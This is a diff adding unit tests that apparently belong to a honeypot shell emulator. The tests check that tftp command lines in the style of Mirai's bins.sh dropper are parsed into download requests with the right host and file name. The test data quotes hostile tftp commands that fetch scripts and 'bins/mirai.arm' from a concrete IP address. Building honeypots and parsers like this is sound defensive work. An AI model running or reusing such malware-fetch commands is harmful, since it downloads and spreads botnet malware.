@@ -502,3 +502,24 @@ def test_split_stops_early_on_huge_input():
     start = time.monotonic()
     assert len(split_command_line("a;" * 500_000)) == MAX_CHAIN_SEGMENTS
     assert time.monotonic() - start < 1.0
+
+
+def test_tftp_host_is_not_confused_with_option_values():
+    # The classic Mirai bins.sh forms; the first non-dash word after `-r`/`-l`
+    # is a file name, never the host.
+    persona = PersonaConfig(arch="riscv64")
+    for line, filename in [
+        ("tftp -r tftp2.sh -g 213.232.114.14", "tftp2.sh"),
+        ("tftp -g -r tftp2.sh 213.232.114.14", "tftp2.sh"),
+        ("tftp -l /tmp/x -r bins/mirai.arm -g 213.232.114.14 69", "/tmp/x"),
+        ("busybox tftp -g -l /tmp/x -r y 213.232.114.14", "/tmp/x"),
+        ("tftp 213.232.114.14 -c get tftp1.sh", "tftp1.sh"),
+    ]:
+        req = dispatch(line, _fs(), persona).download_request
+        assert req is not None, line
+        assert (req.protocol, req.url, req.requested_filename) == ("tftp", "213.232.114.14", filename), line
+
+
+def test_tftp_without_a_host_is_not_a_download():
+    for line in ("tftp -g -r only-a-file", "tftp -g -r"):  # -r consumes the file name
+        assert dispatch(line, _fs(), PersonaConfig(arch="riscv64")).download_request is None
